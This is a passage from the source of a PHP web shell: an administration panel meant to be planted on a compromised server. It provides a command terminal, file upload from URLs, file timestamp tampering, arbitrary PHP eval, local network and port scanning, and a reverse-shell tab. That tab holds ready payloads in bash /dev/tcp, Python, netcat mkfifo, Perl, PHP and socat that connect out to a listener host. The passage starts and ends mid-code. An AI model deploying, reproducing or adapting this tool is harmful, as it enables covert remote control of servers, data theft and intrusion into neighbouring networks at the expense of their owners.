                $php_script .= 'foreach($ips as $i => $ip) { if(!file_exists($pid_file)) exit(); $cmd = ($os === "WIN") ? "ping -n 1 -w 500 " . $ip : "ping -c 1 -W 0.5 " . $ip; $output = shell_exec($cmd); if (stripos($output, "ttl") !== false) { file_put_contents($file, $ip."\n", FILE_APPEND); } file_put_contents($file, "progress:".ceil((($i+1)/$total)*100)."\n", FILE_APPEND); }';
            } elseif ($scan_type === 'port') {
                $ips = json_decode($_POST['ips'], true);
                $ports_str = $_POST['ports'];
                $ports = array();
                foreach(explode(',', $ports_str) as $part) { if(strpos($part, '-') !== false) { list($start, $end) = explode('-', $part); $ports = array_merge($ports, range($start, $end)); } else { $ports[] = (int)$part; } } $ports = array_unique($ports);
                $php_script .= '$ips = '.var_export($ips, true).'; $ports = '.var_export($ports, true).'; $total = count($ips) * count($ports); $scanned = 0;';
                $php_script .= 'foreach($ips as $ip) { foreach($ports as $port) { if(!file_exists($pid_file)) exit(); $conn = @fsockopen($ip, $port, $errno, $errstr, 0.1); if (is_resource($conn)) { file_put_contents($file, $ip.":".$port."\n", FILE_APPEND); fclose($conn); } $scanned++; file_put_contents($file, "progress:".ceil(($scanned/$total)*100)."\n", FILE_APPEND); } }';
            }
            $php_script .= 'file_put_contents($file, "done\n", FILE_APPEND); @unlink($pid_file); @unlink(__FILE__); ?>';
            file_put_contents($script_file, $php_script);
            pclose(popen((get_os_type() === 'WIN' ? 'start /B ' : 'nohup ') . "php -f {$script_file} > /dev/null 2>&1 &", 'r'));
            $response = array('status' => 'success', 'scan_id' => $scan_id);
            break;
        case 'check_scan_progress':
            $scan_id = $_POST['scan_id'];
            $result_file = sys_get_temp_dir() . "/$scan_id.log";
            if (file_exists($result_file)) {
                $content = file_get_contents($result_file);
                $lines = explode("\n", trim($content));
                $results = array(); $progress = 0; $done = false;
                foreach ($lines as $line) {
                    if (strpos($line, 'progress:') === 0) { $progress = (int)substr($line, 9); }
                    elseif ($line === 'done') { $done = true; @unlink($result_file); @unlink(sys_get_temp_dir() . "/$scan_id.php"); }
                    elseif (!empty($line)) { $results[] = $line; }
                }
                $response = array('status' => 'success', 'results' => $results, 'progress' => $progress, 'done' => $done);
            }
            break;
        case 'stop_scan':
            $scan_id = $_POST['scan_id'];
            $pid_file = sys_get_temp_dir() . "/$scan_id.pid";
            if (file_exists($pid_file)) {
                $pid = file_get_contents($pid_file);
                if ($pid) { @shell_exec(get_os_type() === 'WIN' ? "taskkill /PID $pid /F" : "kill -9 $pid"); }
                @unlink($pid_file); @unlink(sys_get_temp_dir() . "/$scan_id.log"); @unlink(sys_get_temp_dir() . "/$scan_id.php");
            }
            $response = array('status' => 'success', 'message' => 'Scan terminated.');
            break;
        case 'get_phpinfo':
            ob_start();
            phpinfo();
            $phpinfo_html = ob_get_clean();
            preg_match('/<body[^>]*>(.*?)<\/body>/is', $phpinfo_html, $matches);
            $response = array('status' => 'success', 'data' => isset($matches[1]) ? $matches[1] : 'Could not parse phpinfo() output.');
            break;
    }
    echo json_encode($response);
    return;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo SHELL_VERSION; ?></title>
    <style>
        :root {
            --color-dark-brown: #A67A5B; --color-mid-tan: #C19770; --color-light-beige: #D5B895;
            --light-bg: #FDFBF8; --light-text: #4d4033; --light-border: #e9e2d7;
            --danger-color: #d98686; --success-color: #86d993; --info-color: #86aed9;
            --font-sans: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            --font-mono: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, Courier, monospace;
            --main-bg: var(--light-bg); --secondary-bg: white; --main-text: var(--light-text);
            --secondary-text: var(--color-mid-tan); --accent-color: var(--color-dark-brown); --main-border: var(--light-border);
        }
        html[data-theme="dark"] {
            --main-bg: #2a241f; --secondary-bg: #3b352e; --main-text: var(--color-light-beige);
            --secondary-text: var(--color-mid-tan); --accent-color: var(--color-mid-tan); --main-border: #4e4840;
        }
        * { box-sizing: border-box; }
        body { margin: 0; font-family: var(--font-sans); background-color: var(--main-bg); color: var(--main-text); font-size: 15px; transition: background-color 0.3s, color 0.3s; }
        .container { max-width: 1300px; margin: 2rem auto; padding: 1rem; }
        header { position: relative; }
        header h1 { font-size: 2.8rem; text-align: center; color: var(--main-text); font-weight: 300; letter-spacing: 2px; margin-bottom: 2rem; }
        #theme-toggle { position: absolute; top: 10px; right: 10px; background: none; border: 1px solid var(--main-border); color: var(--secondary-text); cursor: pointer; border-radius: 50%; width: 40px; height: 40px; font-size: 1.2rem; line-height: 1; transition: all 0.3s; }
        #theme-toggle:hover { background-color: var(--secondary-bg); color: var(--main-text); transform: scale(1.1) rotate(15deg); }
        nav { display: flex; flex-wrap: wrap; justify-content: center; gap: 0; margin-bottom: 2.5rem; border-bottom: 1px solid var(--main-border); }
        .nav-tab { padding: 0.8rem 1.8rem; background-color: transparent; border: none; color: var(--secondary-text); cursor: pointer; transition: all 0.25s ease-out; font-size: 1rem; border-bottom: 3px solid transparent; margin-bottom: -1px; }
        .nav-tab.active, .nav-tab:hover { color: var(--main-text); border-bottom-color: var(--accent-color); }
        .tab-content { display: none; } .tab-content.active { display: block; }
        .section { background-color: var(--secondary-bg); padding: 2rem; border-radius: 6px; margin-top: 2rem; border: 1px solid var(--main-border); box-shadow: 0 4px 25px rgba(0,0,0,0.07); transition: background-color 0.3s, border-color 0.3s; }
        h2 { font-size: 1.6rem; color: var(--main-text); margin: 0 0 1.5rem 0; font-weight: 600; padding-bottom: 0.5rem; border-bottom: 1px solid var(--main-border); }
        h3 { font-size: 1.2rem; color: var(--main-text); margin: 1.5rem 0 1rem 0; font-weight: 600; }
        button { background-color: var(--accent-color); color: white; border: none; padding: 0.7rem 1.4rem; border-radius: 4px; font-weight: bold; cursor: pointer; transition: all 0.2s ease; font-family: var(--font-sans); font-size: 0.9rem; }
        button:hover:not(:disabled) { filter: brightness(1.1); transform: translateY(-1px); }
        button:disabled { background-color: var(--main-border); cursor: not-allowed; }
        button.danger { background-color: var(--danger-color); }
        button.secondary { background-color: var(--secondary-text); }
        input, textarea, select { width: 100%; background-color: var(--main-bg); border: 1px solid var(--main-border); color: var(--main-text); padding: 0.7rem; border-radius: 4px; font-family: var(--font-mono); font-size: 0.95rem; transition: all 0.3s ease; }
        input:focus, textarea:focus, select:focus { outline: none; border-color: var(--accent-color); box-shadow: 0 0 0 3px color-mix(in srgb, var(--accent-color) 25%, transparent); }
        .flex-group { display: flex; gap: 1rem; align-items: center; flex-wrap: wrap; }
        #toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background-color: #333; color: white; padding: 1rem 1.5rem; border-radius: 4px; z-index: 1000; display: none; box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 1rem; text-align: left; border-bottom: 1px solid var(--main-border); word-break: break-all; }
        th { color: var(--main-text); font-size: 0.9rem; text-transform: uppercase; letter-spacing: 0.5px; }
        tr:last-child td { border-bottom: none; }
        tbody tr { transition: background-color: 0.2s; }
        tbody tr:hover { background-color: color-mix(in srgb, var(--secondary-bg) 95%, black); }
        html[data-theme="dark"] tbody tr:hover { background-color: rgba(255,255,255,0.03); }
        a { color: var(--accent-color); font-weight: bold; text-decoration: none; } a:hover { text-decoration: underline; }
        .actions button, .actions .button-link { font-size: 14px; padding: 5px 10px; margin-right: 5px; line-height: 1; vertical-align: middle; }
        pre { background-color: var(--main-bg); border: 1px solid var(--main-border); padding: 1rem; border-radius: 4px; white-space: pre-wrap; word-break: break-all; font-family: var(--font-mono); margin: 0; line-height: 1.6; max-height: 400px; overflow-y: auto;}
        code { background-color: var(--main-bg); padding: 2px 5px; border-radius: 3px; font-size: 0.9em; border: 1px solid var(--main-border); }
        .terminal { height: 400px; overflow-y: auto; }
        .terminal-prompt { color: var(--accent-color); font-weight: bold; }
        .info-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 1.5rem; }
        .info-card { background-color: var(--main-bg); border: 1px solid var(--main-border); padding: 1rem; border-radius: 4px; transition: background-color 0.3s, border-color 0.3s; }
        .db-details-table { margin-top: 1rem; width: 100%; border-collapse: collapse; }
        .db-details-table td { padding: 0.6rem 0; border: none; border-bottom: 1px solid var(--main-border); font-family: var(--font-mono); font-size: 0.9rem; word-break: break-word; }
        .db-details-table tr:last-child td { border: none; }
        .db-details-table td:first-child { font-weight: bold; padding-right: 1rem; color: var(--secondary-text); white-space: nowrap; }
        #path-bar { font-family: var(--font-mono); background-color: var(--main-bg); padding: 0.8rem 1rem; border-radius: 4px; margin-bottom: 1.5rem; border: 1px solid var(--main-border); }
        #editor-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: color-mix(in srgb, var(--main-bg) 60%, transparent); backdrop-filter: blur(5px); z-index: 100; justify-content: center; align-items: center; }
        #editor-container { width: 80%; max-width: 1200px; height: 80%; background: var(--secondary-bg); display: flex; flex-direction: column; border-radius: 6px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
        #editor-header, #editor-footer { padding: 1rem; background-color: var(--main-bg); border-bottom: 1px solid var(--main-border); }
        #editor-header { font-family: var(--font-mono); }
        #editor-footer { text-align: right; border-top: 1px solid var(--main-border); border-bottom: none; }
        #file-content-textarea { flex-grow: 1; resize: none; margin: 1rem; border: none !important; box-shadow: none !important; background-color: transparent !important; }
        .progress-bar { width: 100%; background-color: var(--main-bg); border-radius: 4px; padding: 2px; border: 1px solid var(--main-border); margin-top: 1rem; }
        .progress-bar-inner { width: 0%; height: 14px; background-color: var(--accent-color); border-radius: 3px; transition: width 0.3s ease; text-align: center; font-size: 10px; line-height: 14px; color: white; }
        .host-list { display: flex; flex-wrap: wrap; gap: 0.5rem; margin-top: 1rem; padding: 1rem; background-color: var(--main-bg); border-radius: 4px; min-height: 50px; }
        .host-item { display: flex; align-items: center; gap: 0.5rem; padding: 0.3rem 0.6rem; border: 1px solid var(--main-border); border-radius: 4px; }
        #phpinfo-content table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
        #phpinfo-content td, #phpinfo-content th { border: 1px solid var(--main-border); padding: 0.5rem; }
        #phpinfo-content tr:nth-child(odd) { background-color: var(--main-bg); }
        #phpinfo-content h1, #phpinfo-content h2 { color: var(--main-text); border-bottom: 1px solid var(--main-border); }
        #phpinfo-content a { color: var(--accent-color); }
        .actions a.button-link { display: inline-block; background-color: var(--accent-color); color: white !important; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; transition: all 0.2s ease; font-family: var(--font-sans); text-decoration: none !important; }
        .actions a.button-link:hover { filter: brightness(1.1); transform: translateY(-1px); }
    </style>
    <script> (function() { const theme = localStorage.getItem('theme'); if (theme === 'dark') document.documentElement.setAttribute('data-theme', 'dark'); })(); </script>
</head>
<body>
    <div class="container">
        <header>
            <h1><?php echo SHELL_VERSION; ?></h1>
            <button id="theme-toggle" title="Toggle Theme">🌙</button>
        </header>
        <nav>
            <button class="nav-tab active" data-tab="manage">Manage</button>
            <button class="nav-tab" data-tab="sysinfo">System Info</button>
            <button class="nav-tab" data-tab="processes">Processes</button>
            <button class="nav-tab" data-tab="phpeval">PHP Eval</button>
            <button class="nav-tab" data-tab="reverseshell">Reverse Shell</button>
        </nav>
        <main>
            <div id="manage" class="tab-content active"><div class="section"><h2>Command Terminal</h2><pre id="terminal-output" class="terminal"></pre><form id="terminal-form" class="flex-group" style="margin-top: 1.5rem;"><label id="terminal-prompt" class="terminal-prompt" for="terminal-input"></label><input type="text" id="terminal-input" autocomplete="off" style="flex-grow: 1;" autofocus><button type="submit">Execute</button></form></div><div class="section"><h2>File Manager</h2><div id="path-bar"></div><table><thead><tr><th>Name</th><th>Type</th><th>Size</th><th>Modified</th><th>Perms</th><th>Actions</th></tr></thead><tbody id="file-manager-tbody"></tbody></table><div style="margin-top: 2rem; display: grid; grid-template-columns: 1fr 1fr; gap: 2rem;"><form id="create-item-form" class="flex-group"><input type="text" id="new-item-name" placeholder="New file/dir name..." required><button type="submit" data-type="file">File</button><button type="submit" data-type="dir">Dir</button></form><form id="upload-form" class="flex-group"><input type="file" id="upload-files-input" multiple required><button type="submit">Upload</button></form><form id="upload-link-form" class="flex-group" style="margin-top: 1rem;"><input type="text" id="upload-link-url" placeholder="https://example.com/file.exe" required><button type="submit">Upload from Link</button></form></div></div></div>
            <div id="sysinfo" class="tab-content"><div class="section"><h2>System Information</h2><div id="sysinfo-grid" class="info-grid"></div><button id="sysinfo-refresh" style="margin-top: 1.5rem;">Refresh</button></div><div id="sysinfo-dynamic-content"></div><div class="section"><div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1.5rem;"><h2 style="margin: 0; border: none; padding: 0;">PHP Configuration Details</h2><button id="phpinfo-toggle-btn" style="display: none; font-size: 12px; padding: 5px 10px;">Minimize</button></div><button id="phpinfo-load-btn">Show Full PHP Info</button><div id="phpinfo-content" style="margin-top: 1.5rem; max-height: 500px; overflow-y: auto; display: none;"></div></div><div class="section"><h2>Local Network Scanner</h2><div class="flex-group"><input type="text" id="net-scan-range" placeholder="e.g., 192.168.1.0/24 or 192.168.1.1-254" value="192.168.1.0/24"><button id="net-scan-start-btn">Start Scan</button><button id="net-scan-stop-btn" class="danger" style="display:none;">Stop Scan</button></div><div id="net-scan-progress" class="progress-bar" style="display: none;"><div class="progress-bar-inner"></div></div><div id="net-scan-results" class="host-list"></div></div><div id="port-scanner-section" class="section" style="display: none;"><h2>Port Scanner</h2><div class="flex-group"><input type="text" id="port-scan-ports" placeholder="e.g., 80,443,100-200"><select id="port-scan-presets" style="max-width: 200px;"><option value="">Presets...</option><option value="21,22,23,25,53,80,443,3306,5432,8080">Top 10</option><option value="80,443,8080,8443">Web Ports</option><option value="1-65535">Full Scan (Slow)</option></select><button id="port-scan-start-btn">Scan Selected</button><button id="port-scan-stop-btn" class="danger" style="display:none;">Stop Scan</button></div><div id="port-scan-progress" class="progress-bar" style="display: none;"><div class="progress-bar-inner"></div></div></div><div id="port-scan-results"></div></div>
            <div id="processes" class="tab-content"><div class="section"><h2>Process List</h2><div style="max-height: 600px; overflow-y: auto;"><table id="processes-table"><thead id="processes-table-head"></thead><tbody id="processes-table-body"></tbody></table></div><button id="processes-refresh" style="margin-top: 1.5rem;">Refresh</button></div></div>
            <div id="phpeval" class="tab-content"><div class="section"><h2>PHP Code Execution</h2><form id="phpeval-form"><textarea id="php-code-input" rows="10" placeholder="echo 'Hello, World!';"></textarea><button type="submit" style="margin-top: 1rem;">Execute</button></form><h3 style="margin-top: 2rem;">Output:</h3><pre id="phpeval-output"></pre></div></div>
            <div id="reverseshell" class="tab-content"><div class="section"><h2>Reverse Shell Connector</h2><div class="flex-group"><input type="text" id="revshell-host" value="<?php echo REVERSE_SHELL_DEFAULT_IP; ?>" required placeholder="Listener IP"><input type="text" id="revshell-port" value="<?php echo REVERSE_SHELL_DEFAULT_PORT; ?>" required style="max-width: 120px;" placeholder="Port"></div><div class="flex-group" style="margin-top: 1.5rem;"><div style="flex-grow: 1;"><label for="revshell-type" style="display: block; margin-bottom: .5rem; font-size: .9rem; color: var(--secondary-text);">Payload Type</label><select id="revshell-type"></select></div><button id="revshell-execute-btn" class="danger">Execute</button></div></div><div class="section"><h2>Manual Command</h2><form id="revshell-manual-form" class="flex-group"><input type="text" id="revshell-manual-cmd" placeholder="Enter full reverse shell command..."><button type="submit">Execute Manual</button></form></div><div class="section"><h2>Active Sessions</h2><button id="revshell-refresh" style="float: right; margin-bottom: 1rem;">Refresh</button><table><thead><tr><th>PID</th><th>Target</th><th>Started</th><th>Status</th><th>Actions</th></tr></thead><tbody id="revshell-sessions-tbody"></tbody></table></div></div>
        </main>
    </div>
    <div id="editor-modal"><div id="editor-container"><div id="editor-header"></div><textarea id="file-content-textarea"></textarea><div id="editor-footer"><button id="editor-cancel" class="secondary">Cancel</button><button id="editor-save">Save</button></div></div></div>
    <div id="toast"></div>

<script>
document.addEventListener('DOMContentLoaded', () => {
    const G = id => document.getElementById(id);

    const state = {
        terminalCwd: sessionStorage.getItem('v_tcwd') || '<?php echo addslashes($_SESSION['terminal_cwd']); ?>',
        currentFileForEditor: '',
        netScanId: null,
        portScanId: null,
        netPollInterval: null,
        portPollInterval: null
    };

    const userHost = <?php echo json_encode(get_current_user_host()); ?>;
    const revShellPayloads = { "Python3 PTY": "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"sh\")'", "Bash TCP (Interactive)": "bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'", "PHP proc_open": "php -r '$s=fsockopen(\"{ip}\",{port});$proc=proc_open(\"sh -i\", array(0=>$s, 1=>$s, 2=>$s),$pipes);'", "Netcat (mkfifo)": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip} {port} >/tmp/f", "Perl": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"sh -i\");};'", "Socat PTY": "socat TCP:{ip}:{port} EXEC:sh,pty,stderr,setsid,sigint,sane", };
    const formatBytes = b => {if(!+b)return"N/A";const k=1024,s=["B","KB","MB","GB","TB"],i=Math.floor(Math.log(b)/Math.log(k));return`${parseFloat((b/k**i).toFixed(2))} ${s[i]}`};
    const showToast = (message) => { const toast = G('toast'); toast.textContent = message; toast.style.display = 'block'; setTimeout(() => { toast.style.display = 'none'; }, 4000); };

    const apiRequest = async formData => {
        try {
            const k = sessionStorage.getItem('v_key');
            const cwd = sessionStorage.getItem('v_cwd') || '';
            const tcwd = sessionStorage.getItem('v_tcwd') || '';

            const response = await fetch(window.location.href, {
                method: 'POST',
                headers: {
                    'X-Requested-With': 'XMLHttpRequest',
                    'X-Vault-Key': k,
                    'X-State-CWD': cwd,
                    'X-State-TCWD': tcwd
                },
                body: formData
            });

            if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);

            const data = await response.json();
            if (data.status === 'error') throw new Error(data.message || 'Unknown API error');

            if (data.path) sessionStorage.setItem('v_cwd', data.path);
            if (data.cwd) {
                sessionStorage.setItem('v_tcwd', data.cwd);
                state.terminalCwd = data.cwd;
            }

            if (data.message) showToast(data.message);
            return data;
        } catch (error) {
            showToast("RAM Session Error: Re-Mounting might be required.");
            console.error(error);
            return null;
        }
    };

    const buildFormData = obj => { const fd = new FormData(); for (const key in obj) fd.append(key, obj[key]); return fd; };
    const themeToggle = G('theme-toggle');
    const applyTheme = (theme) => { document.documentElement.setAttribute('data-theme', theme); themeToggle.textContent = theme === 'dark' ? '☀️' : '🌙'; localStorage.setItem('theme', theme); };
    themeToggle.addEventListener('click', () => { applyTheme(document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark'); });
    applyTheme(localStorage.getItem('theme') || 'light');
    document.querySelector('nav').addEventListener('click', e => { if (!e.target.matches('.nav-tab')) return; const tabName = e.target.dataset.tab; document.querySelectorAll('.nav-tab, .tab-content').forEach(el => el.classList.remove('active')); e.target.classList.add('active'); G(tabName).classList.add('active'); const loadFunc = { manage: () => loadFileManager(), sysinfo: loadSysInfo, processes: loadProcesses, reverseshell: loadRevShellSessions }[tabName]; if (loadFunc) loadFunc(); });
    const updateTerminalPrompt = () => { G('terminal-prompt').textContent = `${userHost.user}@${userHost.hostname}:${state.terminalCwd}$ `; };
    const appendToTerminal = (content) => { G('terminal-output').textContent += content; G('terminal-output').scrollTop = G('terminal-output').scrollHeight; };
    G('terminal-form').addEventListener('submit', async e => { e.preventDefault(); const input = G('terminal-input'), command = input.value.trim(); if (!command) return; appendToTerminal(`${G('terminal-prompt').textContent}${command}\n`); input.value = ''; const data = await apiRequest(buildFormData({ action: 'execute_cmd', cmd: command })); if (data) { if (data.output) appendToTerminal(data.output + "\n"); updateTerminalPrompt(); } });
    const loadFileManager = async (dir = null) => {
        const targetDir = dir || sessionStorage.getItem('v_cwd') || '';
        const data = await apiRequest(buildFormData({ action: 'list_dir', dir: targetDir }));
        if (data) {
            G('path-bar').textContent = data.path;
            G('file-manager-tbody').innerHTML = data.listing.map(item => `<tr><td>${item.is_dir ? `<a href="#" data-dir="${item.name}" style="color:black">${item.name}</a>` : `<a href="#" data-action="preview" data-path="${item.name}" style="color: orange" title="Preview file content">${item.name}</a>`}</td><td>${item.type}</td><td>${item.size === '-' ? '-' : formatBytes(item.size)}</td><td>${item.modified}</td><td style="font-family:monospace; font-size: 0.9em; color: #00FF00">${item.permissions}</td><td class="actions">${!item.is_dir ? `<button data-action="edit" data-path="${item.name}" title="Edit">📝</button>` : ''}<button data-action="perms" data-path="${item.name}" data-current-perms="${item.permissions_oct}" title="Change Permissions">⚙️</button><button data-action="rename" data-path="${item.name}" title="Rename">✏️</button><button data-action="date" data-path="${item.name}" title="Change Date">🗓️</button>${!item.is_dir ? `<a href="?action=download&file=${encodeURIComponent(item.name)}&<?php echo $g_k . '=' . $g_v; ?>" class="button-link" title="Download">⬇️</a>` : ''}<button data-action="delete" data-path="${item.name}" class="danger">Del</button></td></tr>`).join('');
        }
    };
    G('file-manager-tbody').addEventListener('click', e => { const dirLink = e.target.closest('a[data-dir]'); const actionTarget = e.target.closest('[data-action]'); if (dirLink) { e.preventDefault(); loadFileManager(G('path-bar').textContent + '/' + dirLink.dataset.dir); return; } if (actionTarget) { e.preventDefault(); const action = actionTarget.dataset.action; const path = actionTarget.dataset.path; const currentPath = G('path-bar').textContent; if (action === 'delete') { if (confirm(`Are you sure you want to delete "${path}"?`)) { apiRequest(buildFormData({ action: 'delete_item', path })).then(d => d && loadFileManager(currentPath)); } } else if (action === 'edit' || action === 'preview') { apiRequest(buildFormData({ action: 'get_file_content', path })).then(data => { if (data) { state.currentFileForEditor = data.path; G('editor-header').textContent = `File: ${data.path}`; G('file-content-textarea').value = data.content; G('editor-modal').style.display = 'flex'; } }); } else if (action === 'rename') { const newName = prompt(`Enter new name for "${path}":`, path); if (newName && newName !== path) { apiRequest(buildFormData({ action: 'rename_item', path, new_name: newName })).then(d => d && loadFileManager(currentPath)); } } else if (action === 'perms') { const currentPerms = actionTarget.dataset.currentPerms || '0644'; const newPerms = prompt(`Enter new permissions for "${path}" (octal format):`, currentPerms); if (newPerms && /^[0-7]{3,4}$/.test(newPerms)) { apiRequest(buildFormData({ action: 'change_permissions', path, permissions: newPerms })).then(d => d && loadFileManager(currentPath)); } else if (newPerms !== null) { showToast('Invalid format. Please use 3 or 4 octal digits (e.g., 0755).'); } } else if (action === 'date') { const newDate = prompt(`Enter a new date/time for "${path}":\n(e.g., "now", "2024-01-01 12:00:00")`, "now"); if (newDate) { apiRequest(buildFormData({ action: 'change_date', path, new_date: newDate })).then(d => d && loadFileManager(currentPath)); } } } });
    G('create-item-form').addEventListener('submit', async e => { e.preventDefault(); if (await apiRequest(buildFormData({ action: 'create_item', type: e.submitter.dataset.type, name: G('new-item-name').value }))) { G('new-item-name').value = ''; loadFileManager(G('path-bar').textContent); } });
    G('upload-form').addEventListener('submit', async e => { e.preventDefault(); const files = G('upload-files-input').files; if (files.length === 0) return; const formData = new FormData(); formData.append('action', 'upload_files'); for (const file of files) formData.append('upload_files[]', file); if (await apiRequest(formData)) { G('upload-form').reset(); loadFileManager(G('path-bar').textContent); } });
    G('upload-link-form').addEventListener('submit', async e => { e.preventDefault(); const url = G('upload-link-url').value; if (!url) return; if (await apiRequest(buildFormData({ action: 'upload_from_url', url }))) { G('upload-link-url').value = ''; loadFileManager(G('path-bar').textContent); } });
    G('editor-save').addEventListener('click', async () => { if (await apiRequest(buildFormData({ action: 'save_file', path: state.currentFileForEditor, content: G('file-content-textarea').value }))) { G('editor-modal').style.display = 'none'; loadFileManager(G('path-bar').textContent); } });
    G('editor-cancel').addEventListener('click', () => G('editor-modal').style.display = 'none');
    const loadProcesses = async () => { const data = await apiRequest(buildFormData({ action: 'get_processes' })); if (!data || !data.data) return; const tableHead = G('processes-table-head'); const tableBody = G('processes-table-body'); tableHead.innerHTML = ''; tableBody.innerHTML = ''; const lines = data.data.trim().split('\n'); if (data.os === 'WIN') { if (lines.length > 0) { const headers = ["Image Name", "PID", "User Name", "CPU Time", "Memory", "Actions"]; tableHead.innerHTML = `<tr>${headers.map(h => `<th>${h}</th>`).join('')}</tr>`; lines.forEach(line => { const columns = line.slice(1, -1).split('","'); if (columns.length < 9) return; const [imageName, pid, , , memUsage, , userName] = columns; tableBody.innerHTML += `<tr><td>${imageName}</td><td>${pid}</td><td>${userName}</td><td>${columns[7]}</td><td>${memUsage}</td><td class="actions"><button class="danger" data-pid="${pid}">Kill</button></td></tr>`; }); } } else { if (lines.length > 0) { const headerLine = lines.shift(); const headers = headerLine.split(/\s+/, 11); headers.push('Actions'); tableHead.innerHTML = `<tr>${headers.map(h => `<th>${h}</th>`).join('')}</tr>`; lines.forEach(line => { const columns = line.split(/\s+/, 11); if (columns.length < 11) return; const pid = columns[1]; tableBody.innerHTML += `<tr>${columns.map(c => `<td>${c.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</td>`).join('')}<td class="actions"><button class="danger" data-pid="${pid}">Kill</button></td></tr>`; }); } } };
    G('processes-table-body').addEventListener('click', async (e) => { if (e.target.matches('button[data-pid]')) { const pid = e.target.dataset.pid; if (confirm(`Are you sure you want to kill process PID: ${pid}?`)) { await apiRequest(buildFormData({ action: 'kill_process', pid: pid })); loadProcesses(); } } });
    G('processes-refresh').addEventListener('click', loadProcesses);
    G('phpeval-form').addEventListener('submit', async e => { e.preventDefault(); const data = await apiRequest(buildFormData({ action: 'php_eval', code: G('php-code-input').value })); if (data) G('phpeval-output').textContent = data.data; });
    const loadRevShellSessions = async () => { const sessionData = await apiRequest(buildFormData({ action: 'get_revshell_sessions' })); if (!sessionData || Object.keys(sessionData.sessions).length === 0) { renderRevShellSessions({}); return; } const statusData = await apiRequest(buildFormData({ action: 'check_revshell_status' })); if (statusData && statusData.statuses) { for (const id in sessionData.sessions) { sessionData.sessions[id].status = statusData.statuses[id] || 'Unknown'; } } renderRevShellSessions(sessionData.sessions); };
    const renderRevShellSessions = sessions => { const statusStyle = status => status === 'Online' ? 'color: var(--success-color);' : 'color: var(--danger-color);'; G('revshell-sessions-tbody').innerHTML = Object.entries(sessions).map(([id, s]) => `<tr><td>${s.pid}</td><td>${s.host}:${s.port}</td><td>${s.time}</td><td style="${statusStyle(s.status)}"><strong>${s.status || 'Checking...'}</strong></td><td class="actions"><button class="danger" data-id="${id}">Kill</button></td></tr>`).join(''); };
    G('revshell-execute-btn').addEventListener('click', async () => { const host = G('revshell-host').value, port = G('revshell-port').value, type = G('revshell-type').value; const command = revShellPayloads[type].replace(/{ip}/g, host).replace(/{port}/g, port); const data = await apiRequest(buildFormData({ action: 'execute_revshell_cmd', command, rhost: host, rport: port })); if (data) loadRevShellSessions(); });
    G('revshell-manual-form').addEventListener('submit', async e => { e.preventDefault(); const command = G('revshell-manual-cmd').value; const match = command.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}).*?(\d{1,5})/); const [host, port] = match ? [match[1], match[2]] : ['manual', 'N/A']; const data = await apiRequest(buildFormData({ action: 'execute_revshell_cmd', command, rhost: host, rport: port })); if (data) { G('revshell-manual-cmd').value = ''; loadRevShellSessions(); } });
    G('revshell-sessions-tbody').addEventListener('click', async e => { if (!e.target.matches('button[data-id]')) return; if (await apiRequest(buildFormData({ action: 'kill_revshell', id: e.target.dataset.id }))) loadRevShellSessions(); });
    G('revshell-refresh').addEventListener('click', loadRevShellSessions);
    const loadSysInfo = async () => { const data = await apiRequest(buildFormData({ action: 'get_sysinfo' })); if (!data) return; const staticInfo = {...data.data}; delete staticInfo['Open Ports']; delete staticInfo['Database Services']; G('sysinfo-grid').innerHTML = Object.entries(staticInfo).map(([k, v]) => { let valueHtml; if (typeof v === 'object' && v !== null && Object.keys(v).length > 0) { valueHtml = `<div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 5px; margin-top: 5px;">${Object.entries(v).map(([cmd, status]) => `<div>${cmd}: <strong style="color: ${status === 'ON' ? 'var(--success-color)' : 'var(--danger-color)'};">${status}</strong></div>`).join('')}</div>`; } else { valueHtml = String(v).replace(/</g, "&lt;").replace(/>/g, "&gt;"); } return `<div class="info-card"><strong>${k}:</strong><br>${valueHtml}</div>`; }).join(''); const dynamicContent = G('sysinfo-dynamic-content'); dynamicContent.innerHTML = ''; const renderTable = (title, headers, rows) => { let content; if (rows && rows.length > 0 && rows[0].status) { content = `<p>${rows[0].message}</p>`; } else if (rows && rows.length > 0) { content = `<table><thead><tr>${headers.map(h => `<th>${h}</th>`).join('')}</tr></thead><tbody>${rows.map(row => `<tr>${Object.values(row).map(val => `<td>${val}</td>`).join('')}</tr>`).join('')}</tbody></table>`; } else { content = `<p>No data to display.</p>` } return `<div class="section"><h2>${title}</h2>${content}</div>`; }; dynamicContent.innerHTML += renderTable('Open Ports (Local)', ['Protocol', 'Port', 'Process/Info'], data.data['Open Ports']); const dbData = data.data['Database Services']; let dbHtml = '<div class="section"><h2>Database Services</h2>'; if (dbData && dbData.length > 0 && dbData[0].status) { dbHtml += `<p>${dbData[0].message}</p>`; } else if (dbData && dbData.length > 0) { dbHtml += '<div class="info-grid">'; dbHtml += dbData.map(db => `<div class="info-card"><strong style="font-size: 1.1em; color: 